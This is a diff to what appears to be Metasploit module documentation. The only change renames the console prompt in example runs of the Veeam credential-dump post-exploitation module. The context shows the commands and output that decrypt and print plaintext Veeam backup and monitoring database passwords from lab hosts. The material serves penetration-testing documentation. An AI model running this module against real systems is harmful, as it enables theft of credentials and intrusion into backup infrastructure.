@@ -159,10 +159,10 @@ Windows Server 2019 host with Veeam Backup & Recovery and Veeam ONE installed w/
 `dump` action:
 
 ```
-msf6 exploit(multi/handler) > use windows/gather/credentials/veeam_credential_dump
-msf6 post(windows/gather/credentials/veeam_credential_dump) > set session 1
+msf exploit(multi/handler) > use windows/gather/credentials/veeam_credential_dump
+msf post(windows/gather/credentials/veeam_credential_dump) > set session 1
 session => 1
-msf6 post(windows/gather/credentials/veeam_credential_dump) > dump
+msf post(windows/gather/credentials/veeam_credential_dump) > dump
 
 [*] Hostname VEEAM01 IPv4 192.168.101.39
 [*] Veeam Backup & Replication Install Path: C:\Program Files\Veeam\Backup and Replication\Backup
@@ -236,16 +236,16 @@ msf6 post(windows/gather/credentials/veeam_credential_dump) > dump
 [+]     P: $XklZZiCpToP5wn7
 [+] Decrypted Veeam ONE Monitor Database Dump: /root/.msf4/loot/20221209091150_default_192.168.101.39_veeam_vom_dec_557706.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/veeam_credential_dump) > 
+msf post(windows/gather/credentials/veeam_credential_dump) > 
 ```
 
 Windows Server 2019 host running Veeam ONE with SQL native auth using the `dump` action:
 
 ```
-msf6 exploit(multi/handler) > use windows/gather/credentials/veeam_credential_dump
-msf6 post(windows/gather/credentials/veeam_credential_dump) > set session 1
+msf exploit(multi/handler) > use windows/gather/credentials/veeam_credential_dump
+msf post(windows/gather/credentials/veeam_credential_dump) > set session 1
 session => 1
-msf6 post(windows/gather/credentials/veeam_credential_dump) > dump
+msf post(windows/gather/credentials/veeam_credential_dump) > dump
 
 [*] Hostname VEEAMONE IPv4 192.168.101.143
 [*] Veeam ONE Monitor Install Path: C:\Program Files\Veeam\Veeam ONE\Veeam ONE Monitor Server
@@ -281,5 +281,5 @@ msf6 post(windows/gather/credentials/veeam_credential_dump) > dump
 [+]     P: 1n$uB0rdin@te&CHuRli$h
 [+] Decrypted Veeam ONE Monitor Database Dump: /root/.msf4/loot/20221209090835_default_192.168.101.143_veeam_vom_dec_424908.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/veeam_credential_dump) >
+msf post(windows/gather/credentials/veeam_credential_dump) >
 ```
